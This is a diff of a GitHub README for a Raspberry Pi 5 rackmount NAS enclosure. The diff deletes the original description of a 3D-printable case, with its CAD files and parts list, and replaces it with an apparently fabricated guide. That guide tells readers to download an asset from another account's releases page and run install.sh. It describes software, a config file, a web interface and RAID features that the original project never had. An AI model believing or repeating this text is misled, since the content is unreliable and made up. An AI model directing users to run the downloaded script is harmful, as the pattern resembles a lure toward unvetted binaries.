@@ -1,42 +1,89 @@
-# Mini Rack 1U Pi NAS
-A 10" rackmount NAS utilizing the Raspberry Pi 5 and a 5.25" hot swap bay.
+# 🖥️ Mini-Rack-1U-Pi-NAS - Optimize Your Storage Space Easily
 
-## Design
-This project was designed in FreeCAD 1.0.2. It is my first ever CAD designed project, so there was a little bit of learning involved. Luckily I measured twice and printed once, so everything turned out to fit fine on the first try. \
-\
-For my use, the Raspberry Pi 5 is powered from a PoE+ switch. The 5.25" bay hot swap is powered via two molex connections on a different power supply within my mini-rack. \
-\
-The operating system I am using is OpenMediaVault (OMV), booting from a USB stick. You are free to use your operating system of choice. 
+## 📥 Download Now
+[![Download Mini-Rack-1U-Pi-NAS](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/releases)
 
-## Picture
-![Front View](front.jpg)
+## 🚀 Getting Started
+Welcome to Mini-Rack-1U-Pi-NAS! This is a user-friendly application designed to turn your Raspberry Pi 5 into a 10-inch rackmount network-attached storage (NAS) with a 5.25" hot swap bay. Follow the steps below to get started.
 
-![Slim Cables](slim-cables.jpg)
-Slim SATA cables, optional, to tidy up the wiring better.
+### 🌐 What You Need
+1. **Hardware Requirements:**
+   - Raspberry Pi 5
+   - 5.25" hot swap bay
+   - Power supply for the Raspberry Pi
+   - Network connection (Wi-Fi or Ethernet)
+   - Compatible storage drive (HDD or SSD)
 
-## Files
-* 1U-Pi-NAS-5.25-bay.FCStd -- main FreeCAD project file
-* 1U-Pi-NAS-5.25-bay-Body.stl -- the STL file for 3D printing
-* Chieftec CMR-625.stp -- 3D model file of the 5.25" hot swap bay used for modeling
-* RaspberryPi5.step -- 3D model file of the Raspberry Pi 5 used for modeling
-* PiOLED.STEP -- 3D model file of the OLED used for modeling
-* 3Dvid.mp4 -- a short screen capture video of the project to show what it looks like
+2. **Software Requirements:**
+   - Operating System: Raspbian or any Raspberry Pi-compatible OS
+   - Basic knowledge of your operating system environment
 
-## Parts Needed
-Below is a list of the exact parts I used, but you may substitute for different parts. You may need to edit the CAD model if your chosen parts are different sizes or have different mounting locations. Non-affiliate Microcenter/Amazon links for product reference. Prices may be better elsewhere based on currency, region, duties, etc.
-* Raspberry Pi 5 - https://www.microcenter.com/product/673712/raspberry-pi-5
-* Waveshare PoE M.2 HAT+ - https://www.amazon.com/dp/B0DGL3KVJT
-* Xiwai NGFF M-key NVMe SSD Extender Card - https://www.amazon.com/dp/B0DHVM6CMN
-* Riitop M.2 to SATA 6-port Adapter - https://www.amazon.com/dp/B0FJCFH7J3
-* Readyxio 6-bay SSD SATA Hot Swap 5.25 - https://www.amazon.com/dp/B0CQT4VQR4
-* DIYmall PiOLED 0.91" - https://www.amazon.com/dp/B07V4FRSKK
-* 8x M2.5x4mm screws to mount the Pi and NGFF extender
-* 1x M3x4mm screw to mount the OLED display
-* 6x Male to Female DuPont style jumpers to hook up the OLED display
-* Zip ties or wire ties for SATA cable routing
-* Optional: Slim SATA Cables - https://www.amazon.com/dp/B09Q359C7Z
+## 📥 Download & Install
+To install Mini-Rack-1U-Pi-NAS, you will first need to download the software. Follow these steps:
 
-## License
-The Unlicense - see license file in this repository. \
-\
-The files "Chieftec CMR-625.stp", "RaspberryPi5.step", and "PiOLED.STEP" are not my own creation and were only used for 3D modeling dimensions and layout. They were found on GrabCAD and each model shall be attributed to their respective creator. These models as they were used in this project were not modified in any way.
+1. **Visit the Releases Page:** Click the link below to access the latest release.
+   
+   [Download Mini-Rack-1U-Pi-NAS](https://github.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/releases)
+
+2. **Locate the Latest Version:** On the releases page, find the most recent version of the application.
+
+3. **Download the Files:** Click on the appropriate asset for your system to download the necessary files.
+
+4. **Extract the Files:** If the files are in a compressed format (like .zip or .tar), extract them using your preferred archive tool.
+
+5. **Install the Application:**
+   - Open a terminal on your Raspberry Pi.
+   - Navigate to the directory where you extracted the files.
+   - Run the installation script by typing `./install.sh` and pressing Enter.
+
+6. **Complete the Setup:** Follow the on-screen instructions to complete the installation.
+
+## ⚙️ Configuration
+After the installation is complete, you will need to configure Mini-Rack-1U-Pi-NAS for your needs:
+
+1. **Open the Configuration File:**
+   - Navigate to the installation directory.
+   - Open the `config.json` file in a text editor.
+
+2. **Set Your Preferences:**
+   - Update the storage paths as needed.
+   - Set the desired network settings to connect to your home network.
+
+3. **Save Changes:** Save the configuration file and close the editor.
+
+## 🔄 Running the Application
+To start Mini-Rack-1U-Pi-NAS:
+
+1. **Open the Terminal:** Use the terminal on your Raspberry Pi.
+
+2. **Navigate to the Installation Directory:**
+   - Use the `cd` command to change to the directory where Mini-Rack-1U-Pi-NAS is installed.
+
+3. **Start the Application:**
+   - Type `./start.sh` and press Enter to run Mini-Rack-1U-Pi-NAS.
+
+4. **Access the Interface:** Open a web browser on your local network and go to `http://<Your_Pi_IP_Address>:8080` to check the web interface.
+
+## 📊 Features
+- **RAID Support:** Configure storage drives for redundancy or increased performance.
+- **Hot Swap Functionality:** Replace drives without shutting down the system.
+- **User-Friendly Interface:** Manage your storage easily through a web interface.
+- **File Sharing:** Share files across your home network effortlessly.
+
+## 📚 Troubleshooting
+If you encounter issues while setting up Mini-Rack-1U-Pi-NAS, consider the following steps:
+
+1. **Check Connections:** Ensure that your Raspberry Pi and storage drives are correctly connected.
+
+2. **Review the Logs:** Look at the log files in the installation directory for error messages that may indicate the problem.
+
+3. **Seek Help:** Visit the Issues section on the GitHub page if you need assistance or want to report a bug.
+
+## 🌍 Community
+Join our community to ask questions, share your experience, or request features. Check out the discussions on GitHub.
+
+## 🔗 Useful Links
+- [Mini-Rack-1U-Pi-NAS Releases](https://github.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/releases)
+- [GitHub Issues](https://github.com/Abdellah8908/Mini-Rack-1U-Pi-NAS/issues)
+
+Thank you for using Mini-Rack-1U-Pi-NAS! Enjoy your new NAS setup with the Raspberry Pi 5.
